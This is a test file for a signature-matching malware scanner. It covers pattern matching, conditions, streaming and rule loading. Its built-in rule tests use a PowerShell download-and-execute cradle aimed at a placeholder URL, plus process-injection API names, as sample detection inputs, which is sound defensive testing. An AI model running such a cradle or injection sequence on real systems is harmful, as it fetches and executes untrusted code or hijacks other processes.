"""Tests for the pattern-rule engine: matching, conditions, streaming."""

import json

import pytest

from argus.rules import (
    BUILTIN_RULES,
    Pattern,
    Rule,
    RuleError,
    RuleMatcher,
    evaluate_rules,
    load_rules,
)


def make_rule(patterns, condition="any", severity="high", name="Test_Rule"):
    return Rule.from_dict(
        {
            "name": name,
            "description": "test rule",
            "severity": severity,
            "condition": condition,
            "patterns": patterns,
        }
    )


def test_text_pattern_match_any():
    rule = make_rule([{"text": "evil-string"}])
    hits = evaluate_rules([rule], b"prefix evil-string suffix")
    assert len(hits) == 1
    assert hits[0].name == "Test_Rule"


def test_text_pattern_no_match():
    rule = make_rule([{"text": "evil-string"}])
    assert evaluate_rules([rule], b"perfectly ordinary content") == []


def test_text_pattern_nocase():
    rule = make_rule([{"text": "DownloadString", "nocase": True}])
    assert evaluate_rules([rule], b"xx downloadstring yy")
    strict = make_rule([{"text": "DownloadString"}])
    assert evaluate_rules([strict], b"xx downloadstring yy") == []


def test_hex_pattern():
    rule = make_rule([{"hex": "55 50 58 30"}])  # UPX0
    assert evaluate_rules([rule], b"MZ....UPX0....")
    assert evaluate_rules([rule], b"MZ....UPX9....") == []


def test_hex_pattern_wildcard():
    rule = make_rule([{"hex": "41 ?? 43"}])  # A ? C
    assert evaluate_rules([rule], b"xxA\x00Cxx")
    assert evaluate_rules([rule], b"xxA\xffCxx")
    assert evaluate_rules([rule], b"xxABDxx") == []


def test_condition_all_requires_every_pattern():
    rule = make_rule(
        [{"text": "VirtualAllocEx"}, {"text": "CreateRemoteThread"}],
        condition="all",
    )
    assert evaluate_rules([rule], b"VirtualAllocEx only") == []
    hits = evaluate_rules([rule], b"VirtualAllocEx and CreateRemoteThread")
    assert len(hits) == 1
    assert hits[0].matched == [0, 1]


def test_streaming_matches_across_chunk_boundary():
    rule = make_rule([{"text": "BOUNDARYSPANNER"}])
    matcher = RuleMatcher([rule])
    matcher.feed(b"aaa BOUND")
    matcher.feed(b"ARYSPAN")
    matcher.feed(b"NER bbb")
    hits = matcher.finish()
    assert len(hits) == 1


def test_streaming_equals_oneshot():
    data = b"".join(bytes([i % 251]) * 7 for i in range(500))
    data += b"needle in the middle" + b"z" * 5000
    rule = make_rule([{"text": "needle in the middle"}, {"hex": "7A 7A 7A"}])
    one_shot = evaluate_rules([rule], data)
    matcher = RuleMatcher([rule])
    for i in range(0, len(data), 113):
        matcher.feed(data[i : i + 113])
    streamed = matcher.finish()
    assert len(one_shot) == len(streamed) == 1
    assert one_shot[0].matched == streamed[0].matched


def test_builtin_rules_are_valid_and_match_samples():
    assert len(BUILTIN_RULES) >= 3
    hits = evaluate_rules(
        BUILTIN_RULES, b"IEX (New-Object Net.WebClient).DownloadString('http://x')"
    )
    assert any(h.name == "Suspicious_PowerShell_Download" for h in hits)
    hits = evaluate_rules(BUILTIN_RULES, b"VirtualAllocEx WriteProcessMemory CreateRemoteThread")
    assert any(h.name == "Process_Injection_API_Combo" for h in hits)
    hits = evaluate_rules(BUILTIN_RULES, b"just a normal text file")
    assert hits == []


def test_rule_validation_errors():
    with pytest.raises(RuleError):
        make_rule([{"text": "x"}], severity="catastrophic")
    with pytest.raises(RuleError):
        make_rule([{"text": "x"}], condition="some")
    with pytest.raises(RuleError):
        make_rule([])
    with pytest.raises(RuleError):
        make_rule([{"bogus": "x"}])
    with pytest.raises(RuleError):
        Pattern.from_hex("ZZ ZZ")


def test_load_rules_from_json(tmp_path):
    path = tmp_path / "rules.json"
    path.write_text(
        json.dumps(
            [
                {
                    "name": "From_File",
                    "description": "loaded from disk",
                    "severity": "low",
                    "patterns": [{"text": "hello"}],
                }
            ]
        ),
        encoding="utf-8",
    )
    rules = load_rules(path)
    assert len(rules) == 1
    assert rules[0].name == "From_File"
    assert evaluate_rules(rules, b"say hello")


def test_load_rules_rejects_bad_json(tmp_path):
    path = tmp_path / "bad.json"
    path.write_text("{not json", encoding="utf-8")
    with pytest.raises(RuleError):
        load_rules(path)
